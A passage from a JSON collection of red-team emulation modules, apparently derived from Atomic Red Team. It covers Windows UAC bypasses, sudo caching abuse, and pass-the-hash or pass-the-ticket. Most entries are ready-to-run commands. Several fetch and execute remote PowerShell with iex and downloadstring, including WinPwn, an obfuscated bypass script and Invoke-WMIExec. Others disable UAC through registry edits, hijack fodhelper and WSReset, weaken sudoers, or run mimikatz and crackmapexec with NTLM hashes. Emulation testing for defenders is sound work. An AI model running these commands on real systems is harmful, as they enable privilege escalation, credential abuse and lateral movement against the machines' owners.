          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "695b2dac-423e-448e-b6ef-5b88e93011d6",
      "module_name": "UACME Bypass Method 34"
    },
    {
      "index": 1338,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "56163687-081f-47da-bb9c-7b231c5585cf",
      "module_name": "UACME Bypass Method 39"
    },
    {
      "index": 1339,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "235ec031-cd2d-465d-a7ae-68bab281e80e",
      "module_name": "UACME Bypass Method 56"
    },
    {
      "index": 1340,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "dfb1b667-4bb8-4a63-a85e-29936ea75f29",
      "module_name": "UACME Bypass Method 59"
    },
    {
      "index": 1341,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "7825b576-744c-4555-856d-caf3460dc236",
      "module_name": "UACME Bypass Method 61"
    },
    {
      "index": 1342,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "UAC bypass using Magic technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "964d8bf8-37bc-4fd3-ba36-ad13761ebbcc",
      "module_name": "WinPwn - UAC Magic"
    },
    {
      "index": 1343,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "UAC bypass using ccmstp technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f3c145f9-3c8d-422c-bd99-296a17a8f567",
      "module_name": "WinPwn - UAC Bypass ccmstp technique"
    },
    {
      "index": 1344,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1ed67900-66cd-4b09-b546-2a0ef4431a0c",
      "module_name": "WinPwn - UAC Bypass DiskCleanup technique"
    },
    {
      "index": 1345,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2b61977b-ae2d-4ae4-89cb-5c36c89586be",
      "module_name": "WinPwn - UAC Bypass DccwBypassUAC technique"
    },
    {
      "index": 1346,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "251c5936-569f-42f4-9ac2-87a173b9e9b8",
      "module_name": "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key"
    },
    {
      "index": 1347,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{commandpath} -Recurse -Force\n"
      },
      "variables": [
        {
          "name": "commandpath",
          "description": "Registry path",
          "type": "string",
          "default_value": "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
        },
        {
          "name": "commandtorun",
          "description": "Command to run",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3b96673f-9c92-40f1-8a3e-ca060846f8d9",
      "module_name": "UAC Bypass with WSReset Registry Modification"
    },
    {
      "index": 1348,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "85f3a526-4cfa-4fe7-98c1-dea99be025c7",
      "module_name": "Disable UAC - Switch to the secure desktop when prompting for elevation via registry key"
    },
    {
      "index": 1349,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "This raglox regarding UACDisableNotify pertains to the notification behavior of UAC. UAC is a critical security feature in Windows that prevents unauthorized changes to the operating system. It prompts the user for permission or an administrator password before allowing actions that could affect the system's operation or change settings that affect other users. The BlotchyQuasar RAT defense evasion activities that the adversary to disable UAC notifications makes it easier for malware and malicious software to execute with elevated privileges. [Article](https://securityintelligence.com/x-force/x-force-hive0129-targeting-financial-institutions-latam-banking-trojan/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 1 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "160a7c77-b00e-4111-9e45-7c2a44eda3fd",
      "module_name": "Disable UAC notification via registry keys"
    },
    {
      "index": 1350,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "This raglox regarding setting ConsentPromptBehaviorAdmin to 0 configures the UAC so that it does not prompt for consent or credentials when actions requiring elevated privileges are performed by users in the administrators group. This means that any operation that would normally trigger a UAC prompt will proceed automatically without user interaction.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a768aaa2-2442-475c-8990-69cf33af0f4e",
      "module_name": "Disable ConsentPromptBehaviorAdmin via registry keys"
    },
    {
      "index": 1351,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "This raglox designed to simulate the UAC bypassed made by ValleyRAT by adding customized ProgIDs registry entry.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\.pwn\\Shell\\Open\\command\" /ve /d \"C:\\Windows\\System32\\calc.exe\" /f\n\nreg add \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /ve /d \".pwn\" /f\n\necho Triggering fodhelper.exe for potential privilege escalation...\nstart fodhelper.exe\n",
        "elevation_required": false,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\.pwn\\Shell\\Open\\command\" /ve /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /ve /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b6f4645c-34ea-4c7c-98f2-d5a2747efb08",
      "module_name": "UAC bypassed by Utilizing ProgIDs registry."
    },
    {
      "index": 1352,
      "technique_id": "T1548.003",
      "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "description": "Common Sudo enumeration methods.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "150c3a08-ee6e-48a6-aeaf-3659d24ceb4e",
      "module_name": "Sudo usage"
    },
    {
      "index": 1353,
      "technique_id": "T1548.003",
      "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "description": "Common Sudo enumeration methods.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if sudo is installed.\n",
          "check_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y sudo)\n"
        }
      ],
      "rx_module_id": "2bf9a018-4664-438a-b435-cc6f8c6f71b1",
      "module_name": "Sudo usage (freebsd)"
    },
    {
      "index": 1354,
      "technique_id": "T1548.003",
      "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a7b17659-dd5e-46f7-b7d1-e6792c91d0bc",
      "module_name": "Unlimited sudo cache timeout"
    },
    {
      "index": 1355,
      "technique_id": "T1548.003",
      "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers\nsudo visudo -c -f /usr/local/etc/sudoers\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if sudo is installed.\n",
          "check_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y sudo)\n"
        }
      ],
      "rx_module_id": "a83ad6e8-6f24-4d7f-8f44-75f8ab742991",
      "module_name": "Unlimited sudo cache timeout (freebsd)"
    },
    {
      "index": 1356,
      "technique_id": "T1548.003",
      "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "91a60b03-fb75-4d24-a42e-2eb8956e8de1",
      "module_name": "Disable tty_tickets for sudo caching"
    },
    {
      "index": 1357,
      "technique_id": "T1548.003",
      "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /usr/local/etc/sudoers\"\nsudo visudo -c -f /usr/local/etc/sudoers\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if sudo is installed.\n",
          "check_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y sudo)\n"
        }
      ],
      "rx_module_id": "4df6a0fe-2bdd-4be8-8618-a6a19654a57a",
      "module_name": "Disable tty_tickets for sudo caching (freebsd)"
    },
    {
      "index": 1358,
      "technique_id": "T1550.002",
      "technique_name": "Use Alternate Authentication Material: Pass the Hash",
      "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_name",
          "description": "username",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "ntlm",
          "description": "ntlm hash",
          "type": "string",
          "default_value": "cc36cf7a8514893efccd3324464tkg1a"
        },
        {
          "name": "domain",
          "description": "domain",
          "type": "string",
          "default_value": "%userdnsdomain%"
        },
        {
          "name": "mimikatz_path",
          "description": "mimikatz windows executable",
          "type": "path",
          "default_value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
          "check_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        }
      ],
      "rx_module_id": "ec23cef9-27d9-46e4-a68d-6f75f7b86908",
      "module_name": "Mimikatz Pass the Hash"
    },
    {
      "index": 1359,
      "technique_id": "T1550.002",
      "technique_name": "Use Alternate Authentication Material: Pass the Hash",
      "description": "command execute with crackmapexec\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_name",
          "description": "username",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "crackmapexec_exe",
          "description": "crackmapexec windows executable",
          "type": "path",
          "default_value": "C:\\CrackMapExecWin\\crackmapexec.exe"
        },
        {
          "name": "command",
          "description": "command to execute",
          "type": "string",
          "default_value": "whoami"
        },
        {
          "name": "ntlm",
          "description": "command",
          "type": "string",
          "default_value": "cc36cf7a8514893efccd3324464tkg1a"
        },
        {
          "name": "domain",
          "description": "domain",
          "type": "string",
          "default_value": "%userdnsdomain%"
        }
      ],
      "prerequisites": [
        {
          "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
          "check_command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}\n"
        }
      ],
      "rx_module_id": "eb05b028-16c8-4ad8-adea-6f5b219da9a9",
      "module_name": "crackmapexec Pass the Hash"
    },
    {
      "index": 1360,
      "technique_id": "T1550.002",
      "technique_name": "Use Alternate Authentication Material: Pass the Hash",
      "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ntlm",
          "description": "ntlm hash",
          "type": "string",
          "default_value": "cc36cf7a8514893efccd3324464tkg1a"
        },
        {
          "name": "user_name",
          "description": "username",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "command",
          "description": "Command to run on target system",
          "type": "string",
          "default_value": "hostname"
        },
        {
          "name": "target",
          "description": "System to run command on",
          "type": "string",
          "default_value": "$env:COMPUTERNAME"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f8757545-b00a-4e4e-8cfb-8cfb961ee713",
      "module_name": "Invoke-WMIExec Pass the Hash"
    },
    {
      "index": 1361,
      "technique_id": "T1550.003",
      "technique_name": "Use Alternate Authentication Material: Pass the Ticket",
      "description": "Similar to PTH, but attacking Kerberos\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{mimikatz_exe}\" \"kerberos::ptt #{ticket}\"\n",
        "elevation_required": false,
